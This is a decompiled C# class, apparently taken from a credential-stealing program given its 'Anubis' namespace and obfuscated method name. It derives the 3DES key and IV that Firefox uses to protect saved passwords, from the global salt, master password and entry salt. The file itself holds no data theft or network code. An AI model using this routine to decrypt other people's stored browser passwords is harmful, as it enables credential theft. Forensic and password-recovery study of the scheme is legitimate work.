using System;
using System.Security.Cryptography;

namespace Anubis
{
	// Token: 0x02000053 RID: 83
	public class Gecko8
	{
		// Token: 0x17000064 RID: 100
		// (get) Token: 0x06000263 RID: 611 RVA: 0x0000FAA6 File Offset: 0x0000DCA6
		private byte[] _globalSalt { get; }

		// Token: 0x17000065 RID: 101
		// (get) Token: 0x06000264 RID: 612 RVA: 0x0000FAAE File Offset: 0x0000DCAE
		private byte[] _masterPassword { get; }

		// Token: 0x17000066 RID: 102
		// (get) Token: 0x06000265 RID: 613 RVA: 0x0000FAB6 File Offset: 0x0000DCB6
		private byte[] _entrySalt { get; }

		// Token: 0x17000067 RID: 103
		// (get) Token: 0x06000266 RID: 614 RVA: 0x0000FABE File Offset: 0x0000DCBE
		// (set) Token: 0x06000267 RID: 615 RVA: 0x0000FAC6 File Offset: 0x0000DCC6
		public byte[] DataKey { get; private set; }

		// Token: 0x17000068 RID: 104
		// (get) Token: 0x06000268 RID: 616 RVA: 0x0000FACF File Offset: 0x0000DCCF
		// (set) Token: 0x06000269 RID: 617 RVA: 0x0000FAD7 File Offset: 0x0000DCD7
		public byte[] DataIV { get; private set; }

		// Token: 0x0600026A RID: 618 RVA: 0x0000FAE0 File Offset: 0x0000DCE0
		public Gecko8(byte[] salt, byte[] password, byte[] entry)
		{
			this._globalSalt = salt;
			this._masterPassword = password;
			this._entrySalt = entry;
		}

		// Token: 0x0600026B RID: 619 RVA: 0x0000FB00 File Offset: 0x0000DD00
		public void го7па()
		{
			SHA1CryptoServiceProvider sha1CryptoServiceProvider = new SHA1CryptoServiceProvider();
			byte[] array = new byte[this._globalSalt.Length + this._masterPassword.Length];
			Array.Copy(this._globalSalt, 0, array, 0, this._globalSalt.Length);
			Array.Copy(this._masterPassword, 0, array, this._globalSalt.Length, this._masterPassword.Length);
			byte[] array2 = sha1CryptoServiceProvider.ComputeHash(array);
			byte[] array3 = new byte[array2.Length + this._entrySalt.Length];
			Array.Copy(array2, 0, array3, 0, array2.Length);
			Array.Copy(this._entrySalt, 0, array3, array2.Length, this._entrySalt.Length);
			byte[] key = sha1CryptoServiceProvider.ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(this._entrySalt, 0, array4, 0, this._entrySalt.Length);
			for (int i = this._entrySalt.Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + this._entrySalt.Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(this._entrySalt, 0, array5, array4.Length, this._entrySalt.Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hmacsha = new HMACSHA1(key))
			{
				array6 = hmacsha.ComputeHash(array5);
				byte[] array7 = hmacsha.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + this._entrySalt.Length];
				Array.Copy(array7, 0, array8, 0, array7.Length);
				Array.Copy(this._entrySalt, 0, array8, array7.Length, this._entrySalt.Length);
				array9 = hmacsha.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			this.DataKey = new byte[24];
			for (int j = 0; j < this.DataKey.Length; j++)
			{
				this.DataKey[j] = array10[j];
			}
			this.DataIV = new byte[8];
			int num = this.DataIV.Length - 1;
			for (int k = array10.Length - 1; k >= array10.Length - this.DataIV.Length; k--)
			{
				this.DataIV[num] = array10[k];
				num--;
			}
		}
	}
}
